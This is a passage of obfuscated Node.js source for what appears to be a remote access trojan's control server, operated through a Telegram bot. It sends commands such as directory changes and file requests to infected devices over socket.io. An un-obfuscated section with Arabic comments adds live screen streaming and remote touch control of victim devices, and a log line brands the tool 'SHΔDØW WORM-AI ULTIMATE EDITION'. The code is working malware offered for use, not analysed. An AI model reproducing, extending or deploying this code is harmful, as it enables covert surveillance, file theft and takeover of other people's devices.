                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x3ff)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x31b)]) && (io['to'](_0xc65239)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                                                                'request': _0x39eaaf[_0x5e45b8(0x1fc)],
                                                                'extras': []
                                                            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [
                                                                        [
                                                                            _0x39eaaf[_0x5e45b8(0x3a1)],
                                                                            _0x39eaaf[_0x5e45b8(0x3e3)]
                                                                        ],
                                                                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                                                                    ],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x3a9)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x3a4)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x3ed)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x33d)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x338)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x395)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x40c)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x2a9)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            })), _0x39eaaf[_0x5e45b8(0x2c8)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x208)]) && (appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x38a)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x2b7)], {
                                                                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                                                                'reply_markup': {
                                                                    'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                                                                    'resize_keyboard': !![]
                                                                }
                                                            }));
                                                        } else
                                                            io[_0x5e45b8(0x3c1)][_0x5e45b8(0x3c1)][_0x5e45b8(0x35e)]((_0x4324b2, _0x200d29, _0x5e4345) => {
                                                                const _0x588eb1 = _0x5e45b8;
                                                                _0x39eaaf[_0x588eb1(0x2c8)](_0x517bec[_0x588eb1(0x3ea)], _0x4324b2[_0x588eb1(0x3a6)]) && (appData[_0x588eb1(0x3fe)](_0x39eaaf[_0x588eb1(0x30d)], _0x200d29), bot[_0x588eb1(0x369) + 'e'](data['id'], _0x588eb1(0x2bb) + _0x588eb1(0x2b6) + _0x588eb1(0x299) + _0x588eb1(0x3bb) + _0x4324b2[_0x588eb1(0x3a6)] + _0x588eb1(0x20f), {
                                                                    'parse_mode': _0x39eaaf[_0x588eb1(0x2b9)],
                                                                    'reply_markup': {
                                                                        'keyboard': [
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x2d9)],
                                                                                _0x39eaaf[_0x588eb1(0x2bf)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x2ed)],
                                                                                _0x39eaaf[_0x588eb1(0x2ab)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x34f)],
                                                                                _0x39eaaf[_0x588eb1(0x309)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x2b1)],
                                                                                _0x39eaaf[_0x588eb1(0x3b2)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x30f)],
                                                                                _0x39eaaf[_0x588eb1(0x213)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x259)],
                                                                                _0x39eaaf[_0x588eb1(0x3fa)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x208)],
                                                                                _0x39eaaf[_0x588eb1(0x2c7)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x2b8)],
                                                                                _0x39eaaf[_0x588eb1(0x230)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x2a5)],
                                                                                _0x39eaaf[_0x588eb1(0x374)]
                                                                            ],
                                                                            [_0x39eaaf[_0x588eb1(0x3a4)]],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x395)],
                                                                                _0x39eaaf[_0x588eb1(0x31b)]
                                                                            ],
                                                                            [
                                                                                _0x39eaaf[_0x588eb1(0x3d0)],
                                                                                _0x39eaaf[_0x588eb1(0x393)]
                                                                            ],
                                                                            [_0x39eaaf[_0x588eb1(0x225)]]
                                                                        ],
                                                                        'resize_keyboard': !![]
                                                                    }
                                                                }));
                                                            });
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}), bot['on'](_0x286428(0x232), _0x35f9cf => {
    const _0x5a80a5 = _0x286428, _0x5e9760 = {
            'ybnqY': _0x5a80a5(0x2a3),
            'fWhNC': _0x5a80a5(0x381) + _0x5a80a5(0x214),
            'Rvhty': _0x5a80a5(0x23e) + _0x5a80a5(0x3f4) + _0x5a80a5(0x3b8) + _0x5a80a5(0x26a) + _0x5a80a5(0x315) + _0x5a80a5(0x2a1) + _0x5a80a5(0x372) + _0x5a80a5(0x3e2) + _0x5a80a5(0x3cb),
            'Wctnu': _0x5a80a5(0x364),
            'NCwTW': _0x5a80a5(0x281) + _0x5a80a5(0x34c),
            'vqfuH': _0x5a80a5(0x36e) + _0x5a80a5(0x1f6),
            'BHPlN': _0x5a80a5(0x397) + _0x5a80a5(0x29b) + '✯',
            'YIyqH': _0x5a80a5(0x3e8) + _0x5a80a5(0x371),
            'RpRKE': _0x5a80a5(0x2dd),
            'YHZtD': _0x5a80a5(0x3af),
            'ojySU': _0x5a80a5(0x1f5),
            'CfeUK': function (_0x363382, _0x3949a7) {
                return _0x363382 === _0x3949a7;
            },
            'hdJEG': _0x5a80a5(0x302) + 'e'
        };
    if (_0x5e9760[_0x5a80a5(0x31d)](appData[_0x5a80a5(0x214)](_0x5e9760[_0x5a80a5(0x26e)]), _0x5e9760[_0x5a80a5(0x237)])) {
        let _0x2fe8a7 = _0x35f9cf[_0x5a80a5(0x232)][_0x5a80a5(0x3ca)], _0x4bed83 = appData[_0x5a80a5(0x214)](_0x5e9760[_0x5a80a5(0x269)]);
        bot[_0x5a80a5(0x366) + 'k'](_0x2fe8a7)[_0x5a80a5(0x2cd)](_0x5f4d18 => {
            const _0x20e6a4 = _0x5a80a5, _0x19bb35 = _0x5e9760[_0x20e6a4(0x274)][_0x20e6a4(0x1f3)]('|');
            let _0x56af87 = -0x44c + 0x4be * -0x2 + 0xdc8;
            while (!![]) {
                switch (_0x19bb35[_0x56af87++]) {
                case '0':
                    appData[_0x20e6a4(0x319)](_0x5e9760[_0x20e6a4(0x269)]);
                    continue;
                case '1':
                    bot[_0x20e6a4(0x369) + 'e'](data['id'], _0x5e9760[_0x20e6a4(0x3d5)], {
                        'parse_mode': _0x5e9760[_0x20e6a4(0x25d)],
                        'reply_markup': {
                            'keyboard': [
                                [
                                    _0x5e9760[_0x20e6a4(0x248)],
                                    _0x5e9760[_0x20e6a4(0x380)]
                                ],
                                [_0x5e9760[_0x20e6a4(0x2ea)]]
                            ],
                            'resize_keyboard': !![]
                        }
                    });
                    continue;
                case '2':
                    appData[_0x20e6a4(0x319)](_0x5e9760[_0x20e6a4(0x26e)]);
                    continue;
                case '3':
                    io['to'](_0x4bed83)[_0x20e6a4(0x391)](_0x5e9760[_0x20e6a4(0x3ba)], {
                        'request': _0x5e9760[_0x20e6a4(0x308)],
                        'extras': [{
                                'key': _0x5e9760[_0x20e6a4(0x290)],
                                'value': _0x5f4d18
                            }]
                    });
                    continue;
                case '4':
                    console[_0x20e6a4(0x3b1)](_0x5f4d18);
                    continue;
                }
                break;
            }
        });
    }
}), bot['on'](_0x286428(0x363) + _0x286428(0x329), _0x3990bc => {
    const _0x36fd64 = _0x286428, _0x5a96e4 = {
            'ySPWG': function (_0x513e67, _0x32e4a2) {
                return _0x513e67 === _0x32e4a2;
            },
            'RXAGd': _0x36fd64(0x306) + _0x36fd64(0x31e),
            'XjzKl': _0x36fd64(0x377),
            'sThJb': function (_0x3990a1, _0x369a30) {
                return _0x3990a1 === _0x369a30;
            },
            'QQvVe': _0x36fd64(0x298),
            'uRMLo': _0x36fd64(0x3bf),
            'hLifc': _0x36fd64(0x319),
            'KyKEn': function (_0x3f43a7, _0x32849b) {
                return _0x3f43a7 === _0x32849b;
            },
            'ARnlz': function (_0x32c89e, _0x3f35bf) {
                return _0x32c89e === _0x3f35bf;
            },
            'ADLUD': function (_0x15dc24, _0x144c4e) {
                return _0x15dc24 === _0x144c4e;
            },
            'bXPZq': _0x36fd64(0x312),
            'HMTET': _0x36fd64(0x3c8) + _0x36fd64(0x29c),
            'RoMMP': _0x36fd64(0x25b) + _0x36fd64(0x29c),
            'Kbmhr': _0x36fd64(0x364)
        };
    console[_0x36fd64(0x3b1)](_0x3990bc);
    let _0x1cfa71 = _0x3990bc[_0x36fd64(0x26f)], _0x4bf207 = _0x1cfa71[_0x36fd64(0x1f3)]('|')[0x438 + 0x160f * -0x1 + 0x11d7], _0x4286e1 = _0x1cfa71[_0x36fd64(0x1f3)]('|')[-0x11 * -0x25 + -0xa98 + 0x824], _0x2e1f83 = _0x4286e1[_0x36fd64(0x1f3)]('-')[-0x1b * 0x76 + 0x1b48 + 0x6 * -0x279], _0x129c1f = _0x4286e1[_0x36fd64(0x1f3)]('-')[-0x7 * -0x2d4 + -0x7 * -0x4dd + -0x35d6];
    _0x5a96e4[_0x36fd64(0x3d3)](_0x2e1f83, _0x5a96e4[_0x36fd64(0x1fb)]) && io[_0x36fd64(0x3c1)][_0x36fd64(0x3c1)][_0x36fd64(0x35e)]((_0x322441, _0x5bbb31, _0x7c5936) => {
        const _0x399d58 = _0x36fd64;
        _0x5a96e4[_0x399d58(0x3d3)](_0x322441[_0x399d58(0x3a6)], _0x4bf207) && io['to'](_0x5bbb31)[_0x399d58(0x391)](_0x5a96e4[_0x399d58(0x2b3)], {
            'request': _0x5a96e4[_0x399d58(0x1fb)],
            'extras': []
        });
    }), _0x5a96e4[_0x36fd64(0x293)](_0x2e1f83, 'cd') && io[_0x36fd64(0x3c1)][_0x36fd64(0x3c1)][_0x36fd64(0x35e)]((_0x3de87c, _0x59b20d, _0x56e269) => {
        const _0x7f2033 = _0x36fd64;
        _0x5a96e4[_0x7f2033(0x333)](_0x3de87c[_0x7f2033(0x3a6)], _0x4bf207) && io['to'](_0x59b20d)[_0x7f2033(0x391)](_0x5a96e4[_0x7f2033(0x2b3)], {
            'request': 'cd',
            'extras': [{
                    'key': _0x5a96e4[_0x7f2033(0x28b)],
                    'value': _0x129c1f
                }]
        });
    }), _0x5a96e4[_0x36fd64(0x384)](_0x2e1f83, _0x5a96e4[_0x36fd64(0x246)]) && io[_0x36fd64(0x3c1)][_0x36fd64(0x3c1)][_0x36fd64(0x35e)]((_0x5c3d87, _0x2e5d91, _0x1a8008) => {
        const _0x37ce1b = _0x36fd64;
        _0x5a96e4[_0x37ce1b(0x333)](_0x5c3d87[_0x37ce1b(0x3a6)], _0x4bf207) && io['to'](_0x2e5d91)[_0x37ce1b(0x391)](_0x5a96e4[_0x37ce1b(0x2b3)], {
            'request': _0x5a96e4[_0x37ce1b(0x246)],
            'extras': [{
                    'key': _0x5a96e4[_0x37ce1b(0x28b)],
                    'value': _0x129c1f
                }]
        });
    }), _0x5a96e4[_0x36fd64(0x293)](_0x2e1f83, _0x5a96e4[_0x36fd64(0x328)]) && io[_0x36fd64(0x3c1)][_0x36fd64(0x3c1)][_0x36fd64(0x35e)]((_0x28742e, _0x59e6b3, _0x16f3f9) => {
        const _0x23ee0a = _0x36fd64;
        _0x5a96e4[_0x23ee0a(0x333)](_0x28742e[_0x23ee0a(0x3a6)], _0x4bf207) && io['to'](_0x59e6b3)[_0x23ee0a(0x391)](_0x5a96e4[_0x23ee0a(0x2b3)], {
            'request': _0x5a96e4[_0x23ee0a(0x328)],
            'extras': [{
                    'key': _0x5a96e4[_0x23ee0a(0x28b)],
                    'value': _0x129c1f
                }]
        });
    }), _0x5a96e4[_0x36fd64(0x261)](_0x2e1f83, _0x5a96e4[_0x36fd64(0x31c)]) && bot[_0x36fd64(0x307) + _0x36fd64(0x305)](_0x36fd64(0x394) + _0x36fd64(0x234) + '\x20' + _0x129c1f, {
        'chat_id': data['id'],
        'message_id': _0x3990bc[_0x36fd64(0x245)][_0x36fd64(0x3dd)],
        'reply_markup': {
            'inline_keyboard': [[
                    {
                        'text': _0x5a96e4[_0x36fd64(0x386)],
                        'callback_data': _0x4bf207 + _0x36fd64(0x36d) + _0x129c1f
                    },
                    {
                        'text': _0x5a96e4[_0x36fd64(0x3dc)],
                        'callback_data': _0x4bf207 + _0x36fd64(0x228) + _0x129c1f
                    }
                ]]
        },
        'parse_mode': _0x5a96e4[_0x36fd64(0x3d9)]
    });
}), setInterval(() => {
    const _0x4c8d8c = _0x286428, _0x57cf5b = { 'CCUAs': _0x4c8d8c(0x3e7) };
    io[_0x4c8d8c(0x3c1)][_0x4c8d8c(0x3c1)][_0x4c8d8c(0x35e)]((_0x2d2cc4, _0x2a4d9c, _0x415ba4) => {
        const _0x2e535f = _0x4c8d8c;
        io['to'](_0x2a4d9c)[_0x2e535f(0x391)](_0x57cf5b[_0x2e535f(0x40a)], {});
    });
}, 0x23a4 + -0x1 * -0x25a + 0x11 * -0x116), server[_0x286428(0x239)](process[_0x286428(0x330)][_0x286428(0x3c2)] || 0x1 * -0x255c + -0xbff * -0x3 + 0xd17, () => {
    const _0x8ee2dc = _0x286428, _0x10d5ed = { 'hDJBw': _0x8ee2dc(0x334) + _0x8ee2dc(0x1f4) + '00' };
    console[_0x8ee2dc(0x3b1)](_0x10d5ed[_0x8ee2dc(0x2de)]);
});

// ========== معالجة أوامر الكول باك للأزرار الجديدة ========== //
bot.on('callback_query', (query) => {
    const data = query.data;
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    
    if (data.includes('|live')) {
        const deviceId = data.split('|')[0];
        bot.answerCallbackQuery(query.id, { text: 'جاري تجهيز البث المباشر...' });
        
        if (activeStreams.has(deviceId)) {
            const stream = activeStreams.get(deviceId);
            const streamUrl = `http://${os.hostname()}:3000/control/${deviceId}`;
            
            bot.sendMessage(chatId, 
                `🔴 <b>الجهاز ${deviceId} يبث مباشرة</b>\n\n` +
                `🌐 <b>رابط المشاهدة:</b>\n` +
                `<code>${streamUrl}</code>\n\n` +
                `📱 <b>معلومات الشاشة:</b>\n` +
                `الأبعاد: ${stream.screenInfo.width || '?'}x${stream.screenInfo.height || '?'}\n` +
                `آخر تحديث: ${Math.floor((Date.now() - stream.lastFrameTime) / 1000)} ثانية\n\n` +
                `👁 <b>المشاهدين:</b> ${stream.clients.size}`,
                { parse_mode: 'HTML' }
            );
        } else {
            bot.sendMessage(chatId, `❌ الجهاز ${deviceId} لا يبث حالياً`, { parse_mode: 'HTML' });
        }
    }
    
    else if (data.includes('|streams')) {
        const deviceId = data.split('|')[0];
        bot.answerCallbackQuery(query.id, { text: 'جاري عرض البثوث النشطة...' });
        
        const devices = Array.from(activeStreams.keys());
        if (devices.length > 0) {
            let message = '<b>🔴 الأجهزة التي تبث حالياً:</b>\n\n';
            devices.forEach(id => {
                const stream = activeStreams.get(id);
                message += `📱 <b>${id}</b>\n`;
                message += `   👁 المشاهدين: ${stream.clients.size}\n`;
                message += `   📺 ${stream.screenInfo.width || '?'}x${stream.screenInfo.height || '?'}\n`;
                message += `   🔗 /live ${id}\n\n`;
            });
            bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
        } else {
            bot.sendMessage(chatId, '❌ لا توجد بثوث نشطة حالياً', { parse_mode: 'HTML' });
        }
    }
    
    else if (data.includes('|remote')) {
        const deviceId = data.split('|')[0];
        bot.answerCallbackQuery(query.id, { text: 'جاري تجهيز التحكم عن بعد...' });
        
        if (activeStreams.has(deviceId)) {
            const streamUrl = `http://${os.hostname()}:3000/control/${deviceId}`;
            
            bot.sendMessage(chatId, 
                `🖱️ <b>التحكم عن بعد - الجهاز ${deviceId}</b>\n\n` +
                `🌐 <b>رابط التحكم:</b>\n` +
                `<code>${streamUrl}</code>\n\n` +
                `📱 <b>تعليمات:</b>\n` +
                `• انقر على الشاشة للتحكم باللمس\n` +
                `• استخدم الأزرار للسحب والضغط الطويل\n` +
                `• حرك الماوس لمشاهدة الإحداثيات`,
                { parse_mode: 'HTML' }
            );
        } else {
            bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل للبث`, { parse_mode: 'HTML' });
        }
    }
});

console.log('✅ SHΔDØW WORM-AI💀🔥 ULTIMATE EDITION - ALL FEATURES ACTIVATED');
console.log('✅ الأزرار الجديدة: 📺 بث مباشر, 📡 البثوث النشطة, 🖱️ تحكم عن بعد');
console.log('='.repeat(50));